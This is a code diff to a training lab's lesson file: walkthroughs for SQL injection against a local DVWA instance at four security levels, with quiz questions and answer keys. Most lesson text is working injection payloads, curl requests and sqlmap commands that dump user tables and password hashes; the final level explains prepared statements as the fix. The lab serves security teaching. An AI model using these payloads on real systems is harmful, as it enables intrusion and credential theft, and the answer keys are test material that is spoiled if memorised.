@@ -2,49 +2,247 @@ const LESSONS = [
   {
     title: "Level 1: Low Security",
     points: 60,
-    content: "Welcome to the SQL Injection in DVWA lab! First, initialize your environment:\n\n1. Click 'Launch DVWA Instance' above to start your Docker container.\n2. Wait for the new tab to open. You will be on the DVWA Setup page.\n3. Scroll down to the bottom of the page and click the 'Create / Reset Database' button.\n4. After it resets, it will take you to the login screen. Log in using:\n   Username: admin\n   Password: password\n5. Go to 'DVWA Security' and set the security level to 'Low'.\n\n⚠️ IMPORTANT: Do NOT close the lab container until you complete all 4 challenges! If you stop the lab, you will need to start from the beginning (reset the database and login again) to get the challenges back.\n\nNavigate to the 'SQL Injection' tab. Your goal is to exploit the vulnerability and retrieve the flag for the Low level.\n\n### Solving the Challenge (Kali Linux Docker)\n**Manual Terminal Tool (`curl`):** Open your Kali Linux Docker terminal and use `curl` to manually inject the payload. Replace `[TARGET_IP]` and `your_session_id`:\n`curl \"http://[TARGET_IP]/vulnerabilities/sqli/?id=1'+UNION+SELECT+null,version()+%23&Submit=Submit\" -H \"Cookie: security=low; PHPSESSID=your_session_id\"`\n\n**Automated Terminal Tool (`sqlmap`):** Let `sqlmap` automate the extraction:\n`sqlmap -u \"http://[TARGET_IP]/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"security=low; PHPSESSID=your_session_id\" --dump`",
+    content: `🚀 ONE-TIME SETUP — Run this FIRST before any level
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Start your DVWA and Kali containers from the buttons above.
+Inside the Kali terminal (docker exec -it <id> bash), run:
+
+# Set your DVWA port (check the URL of your DVWA browser tab)
+PORT=8206   ← replace with your actual port
+
+# Step 1: Get CSRF token and login
+TOKEN=$(curl -s -c /tmp/dvwa.txt "http://172.17.0.1:$PORT/login.php" | grep -oP "user_token' value='\\K[^']+")
+curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/login.php" \
+  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" -L > /dev/null
+
+# Step 2: Save the session ID to a variable
+SID=$(grep PHPSESSID /tmp/dvwa.txt | awk '{print $NF}')
+echo "Session ready: $SID"
+
+If you see a session ID printed, you are logged in. ✅
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 LEVEL 1 — LOW SECURITY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Set level to Low
+curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
+  -d "security=low&seclev_submit=Submit" > /dev/null
+
+🔬 MANUAL BROWSER METHOD
+━━━━━━━━━━━━━━━━━━━━━━━
+1. In DVWA click 'SQL Injection'. The input box sends a GET request.
+2. Type these payloads one at a time:
+
+  Confirm injectable:
+    1' OR '1'='1    → shows ALL users if injectable
+
+  Find column count (increase number until you get an error):
+    1' ORDER BY 1#   → works
+    1' ORDER BY 2#   → works
+    1' ORDER BY 3#   → ERROR → 2 columns confirmed!
+
+  Find which columns are displayed:
+    1' UNION SELECT 1,2#    → look for '1' and '2' in output
+
+  Extract DB info:
+    1' UNION SELECT version(),user()#
+
+  List all tables:
+    1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database()#
+
+  Dump users:
+    1' UNION SELECT user,password FROM users#
+
+🖥️  MANUAL CURL METHOD
+━━━━━━━━━━━━━━━━━━━━━
+# Confirm injectable (should show multiple users)
+curl -s -H "Cookie: security=low; PHPSESSID=$SID" \
+  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit" \
+  | grep -o "First name:.*"
+
+# Find column count — change 2 to 3 to see the error
+curl -s -H "Cookie: security=low; PHPSESSID=$SID" \
+  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+ORDER+BY+2%23&Submit=Submit" \
+  | grep -o "Unknown column"
+
+# Dump username + password hash
+curl -s -H "Cookie: security=low; PHPSESSID=$SID" \
+  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users%23&Submit=Submit" \
+  | grep -oP "First name: \\K[^<]+"
+
+🤖 SQLMAP METHOD
+━━━━━━━━━━━━━━━━
+sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="security=low; PHPSESSID=$SID" \
+  -D dvwa -T users --dump --batch`,
     questions: [
-      { q: "What is the default username for DVWA?", a: "admin" },
-      { q: "What is the default password for DVWA?", a: "password" },
-      { q: "Have you set the DVWA Security level to Low? (yes/no)", a: "yes" },
-      { q: "What SQL keyword is typically used to append results from a second query?", a: "UNION" },
-      { q: "Submit the flag for the Low security level:", a: "flag{low_sqli}" }
+      { q: "What SQL keyword combines results from two SELECT queries?", a: "UNION" },
+      { q: "How many columns does the DVWA sqli query return? (find with ORDER BY)", a: "2" },
+      { q: "What is admin's password hash? (from UNION SELECT user,password FROM users#)", a: "5f4dcc3b5aa765d61d8327deb882cf99" },
+      { q: "What plaintext password does that hash decode to?", a: "password" },
+      { q: "What is the name of the database? (from UNION SELECT database(),null#)", a: "dvwa" }
     ]
   },
   {
     title: "Level 2: Medium Security",
     points: 60,
-    content: "Great job on Low security! Now, let's step it up.\n\n1. Go to 'DVWA Security' and change the level to 'Medium'.\n2. Return to the 'SQL Injection' tab.\n\nNotice that the input method has changed to a dropdown. The application now uses `mysqli_real_escape_string` to escape single quotes, but the input is treated as an integer.\n\n### Solving the Challenge (Kali Linux Docker)\n**Manual Terminal Tool (`curl`):** Use `curl` to send a POST request, bypassing the frontend dropdown completely. Notice we don't use single quotes in the payload:\n`curl -X POST \"http://[TARGET_IP]/vulnerabilities/sqli/\" -d \"id=1 UNION SELECT null,version()&Submit=Submit\" -H \"Cookie: security=medium; PHPSESSID=your_session_id\"`\n\n**Automated Terminal Tool (`sqlmap`):** Use the `--data` flag in `sqlmap` to attack POST parameters:\n`sqlmap -u \"http://[TARGET_IP]/vulnerabilities/sqli/\" --data=\"id=1&Submit=Submit\" --cookie=\"security=medium; PHPSESSID=your_session_id\" --dump`",
+    content: `📋 LEVEL 2 — MEDIUM SECURITY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Run ONE-TIME SETUP from Level 1 first. PORT and SID must be set.
+
+What changed: Input is now a DROPDOWN. Sends POST request.
+mysqli_real_escape_string() escapes quotes BUT the field is INTEGER — no quotes needed!
+
+# Set level to Medium
+curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
+  -d "security=medium&seclev_submit=Submit" > /dev/null
+
+🔬 MANUAL BROWSER METHOD (Burp Suite)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+1. Enable Burp Suite intercept.
+2. Select a user from the dropdown → click Submit.
+3. Burp shows: id=1&Submit=Submit
+4. Change id to inject (NO quotes needed):
+   1 UNION SELECT user,password FROM users#
+5. Forward the request → see the dumped users in the response.
+
+🖥️  MANUAL CURL METHOD
+━━━━━━━━━━━━━━━━━━━━━
+# Confirm injectable — should show multiple users
+curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
+  -d "id=1 OR 1=1&Submit=Submit" \
+  -H "Cookie: security=medium; PHPSESSID=$SID" | grep -o "First name:.*"
+
+# Dump users (no quotes needed!)
+curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
+  -d "id=1 UNION SELECT user,password FROM users#&Submit=Submit" \
+  -H "Cookie: security=medium; PHPSESSID=$SID" \
+  | grep -oP "First name: \\K[^<]+"
+
+# Get database name
+curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
+  -d "id=1 UNION SELECT database(),user()&Submit=Submit" \
+  -H "Cookie: security=medium; PHPSESSID=$SID" \
+  | grep -oP "First name: \\K[^<]+"
+
+🤖 SQLMAP METHOD
+━━━━━━━━━━━━━━━━
+sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
+  --data="id=1&Submit=Submit" \
+  --cookie="security=medium; PHPSESSID=$SID" \
+  -D dvwa -T users --dump --batch`,
     questions: [
-      { q: "Does the Medium level use a GET or POST request for the vulnerable parameter?", a: "POST" },
-      { q: "What built-in PHP function is often used to escape quotes in Medium security?", a: "mysqli_real_escape_string" },
-      { q: "Can you still perform SQL injection without using single quotes? (yes/no)", a: "yes" },
-      { q: "What tool can you use to intercept and modify the HTTP request?", a: "Burp Suite" },
-      { q: "Submit the flag for the Medium security level:", a: "flag{medium_sqli}" }
+      { q: "In Medium security, is the id parameter sent via GET or POST?", a: "POST" },
+      { q: "What PHP function does DVWA Medium use to try to prevent injection?", a: "mysqli_real_escape_string" },
+      { q: "Do you need single quotes when injecting into an integer-type field? (yes/no)", a: "no" },
+      { q: "What is the 2nd username in the users table? (LIMIT 1,1)", a: "gordonb" },
+      { q: "What is gordonb's password hash?", a: "e99a18c428cb38d5f260853678922e03" }
     ]
   },
   {
     title: "Level 3: High Security",
     points: 60,
-    content: "Time for High security!\n\n1. Set the DVWA Security level to 'High'.\n2. Go to the 'SQL Injection' tab.\n\nHere, the input is submitted on a pop-up page (`session-input.php`), while the output is displayed on the main page. This is a second-order vulnerability.\n\n### Solving the Challenge (Kali Linux Docker)\n**Manual Terminal Tool (`curl`):** This takes two commands. First, inject the payload into the session input page:\n`curl -X POST \"http://[TARGET_IP]/vulnerabilities/sqli/session-input.php\" -d \"id=1' UNION SELECT null,version() %23&Submit=Submit\" -H \"Cookie: security=high; PHPSESSID=your_session_id\"`\nNext, fetch the main page to see the extracted data:\n`curl \"http://[TARGET_IP]/vulnerabilities/sqli/\" -H \"Cookie: security=high; PHPSESSID=your_session_id\"`\n\n**Automated Terminal Tool (`sqlmap`):** Use the `--second-url` flag to tell `sqlmap` where to look for the output:\n`sqlmap -u \"http://[TARGET_IP]/vulnerabilities/sqli/session-input.php\" --data=\"id=1&Submit=Submit\" --second-url=\"http://[TARGET_IP]/vulnerabilities/sqli/\" --cookie=\"security=high; PHPSESSID=your_session_id\" --dump`",
+    content: `📋 LEVEL 3 — HIGH SECURITY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Run ONE-TIME SETUP from Level 1 first. PORT and SID must be set.
+
+What changed: Input is on a separate POP-UP page (session-input.php).
+Output appears on the MAIN page. There is also a LIMIT 1 clause — bypass with UNION.
+This is called "second-order" or "split-page" SQL injection.
+
+# Set level to High
+curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
+  -d "security=high&seclev_submit=Submit" > /dev/null
+
+🔬 MANUAL BROWSER METHOD
+━━━━━━━━━━━━━━━━━━━━━━━
+1. Click 'SQL Injection' → click the link to open the input POP-UP.
+2. In the pop-up text box, type your payload → click Submit.
+3. Close the pop-up → view the MAIN page to see the output.
+
+  Dump users:
+    1' UNION SELECT user,password FROM users#
+  → Main page shows all usernames + hashes!
+
+  Get DB info:
+    1' UNION SELECT database(),user()#
+
+🖥️  MANUAL CURL METHOD (two commands!)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# STEP 1: POST the payload to the session input pop-up page
+curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli/session-input.php" \
+  -d "id=1' UNION SELECT user,password FROM users#&Submit=Submit" \
+  -H "Cookie: security=high; PHPSESSID=$SID" > /dev/null
+
+# STEP 2: Fetch the MAIN page to see the output
+curl -s "http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
+  -H "Cookie: security=high; PHPSESSID=$SID" \
+  | grep -oP "First name: \\K[^<]+"
+
+🤖 SQLMAP METHOD (use --second-url)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli/session-input.php" \
+  --data="id=1&Submit=Submit" \
+  --second-url="http://172.17.0.1:$PORT/vulnerabilities/sqli/" \
+  --cookie="security=high; PHPSESSID=$SID" \
+  -D dvwa -T users --dump --batch`,
     questions: [
-      { q: "In High security, is the vulnerable input on the same page as the output? (yes/no)", a: "no" },
-      { q: "Does the High level restrict the use of single quotes like Medium level did? (yes/no)", a: "no" },
-      { q: "Can you use the exact same payload as the Low level once you find the input field? (yes/no)", a: "yes" },
-      { q: "What attack technique involves exploiting the application when input and output occur on different pages?", a: "Second-order SQL injection" },
-      { q: "Submit the flag for the High security level:", a: "flag{high_sqli}" }
+      { q: "In High security, where is the input field located?", a: "pop-up" },
+      { q: "What is the filename of the pop-up page?", a: "session-input.php" },
+      { q: "What SQL clause limits High level output to 1 row?", a: "LIMIT" },
+      { q: "What sqlmap flag tells it to look for output on a different URL?", a: "--second-url" },
+      { q: "What is the 3rd username in the users table? (LIMIT 2,1)", a: "1337" }
     ]
   },
   {
     title: "Level 4: Impossible Security",
     points: 60,
-    content: "Finally, the 'Impossible' level.\n\n1. Set the DVWA Security level to 'Impossible'.\n2. Navigate to the SQL Injection tab and then examine the source code by clicking 'View Source' at the bottom right.\n\nThis level demonstrates how to properly secure PHP code against SQL injection using prepared statements.\n\n### Solving the Challenge (Kali Linux Docker)\n**Manual Terminal Tool (`curl`):** You can use `curl` to fetch the source code and confirm the use of PDO prepared statements, which block injection. (No injection payload will succeed).\n`curl \"http://[TARGET_IP]/vulnerabilities/sqli/source/impossible.php\" -H \"Cookie: security=impossible; PHPSESSID=your_session_id\"`\n\n**Automated Terminal Tool (`sqlmap`):** If you run `sqlmap` against this level, it will fail to find any injection points. The database is secure! Review the source to find the final flag.",
+    content: `📋 LEVEL 4 — IMPOSSIBLE SECURITY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Run ONE-TIME SETUP from Level 1 first. PORT and SID must be set.
+
+# Set level to Impossible
+curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
+  -d "security=impossible&seclev_submit=Submit" > /dev/null
+
+🧠 WHY PREPARED STATEMENTS BLOCK ALL INJECTION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Vulnerable code (Low/Medium/High):
+  $query = "SELECT * FROM users WHERE id='$id'";
+  User input becomes part of SQL → injection works!
+
+Impossible (PDO Prepared Statement):
+  $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
+  $stmt->bindParam(':id', $id, PDO::PARAM_INT);
+  SQL structure is compiled FIRST. Input arrives only as pure data. Injection impossible.
+
+Click 'View Source' in DVWA to see this code yourself.
+
+🖥️  PROVE IT — Confirm all attacks fail
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Classic UNION attack — returns no data (payload treated as literal string)
+curl -s -H "Cookie: security=impossible; PHPSESSID=$SID" \
+  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users%23&Submit=Submit" \
+  | grep -oP "First name: \\K[^<]+"
+
+# OR injection — returns nothing extra
+curl -s -H "Cookie: security=impossible; PHPSESSID=$SID" \
+  "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit" \
+  | grep -c "First name:"
+
+🤖 SQLMAP — Expects "not injectable"
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="security=impossible; PHPSESSID=$SID" \
+  --batch
+
+Expected: "[WARNING] all tested parameters do not appear to be injectable"`,
     questions: [
-      { q: "What mechanism is used in the Impossible level to completely prevent SQL injection?", a: "Prepared Statements" },
-      { q: "What PHP extension is typically used here to interact with the database safely? (Hint: PHP Data Objects)", a: "PDO" },
-      { q: "Does a prepared statement separate the SQL structure from the data? (yes/no)", a: "yes" },
-      { q: "Are prepared statements effective against most SQL injection attacks? (yes/no)", a: "yes" },
-      { q: "Submit the flag for the Impossible security level:", a: "flag{impossible_sqli}" }
+      { q: "What PHP database extension does the Impossible level use? (3 letters)", a: "PDO" },
+      { q: "What security technique prevents injection on the Impossible level? (two words)", a: "Prepared Statements" },
+      { q: "Does a UNION payload extract data on the Impossible level? (yes/no)", a: "no" },
+      { q: "Will sqlmap find any injection point on the Impossible level? (yes/no)", a: "no" },
+      { q: "What word does sqlmap use in its warning when no injection is found?", a: "injectable" }
     ]
   }
 ];
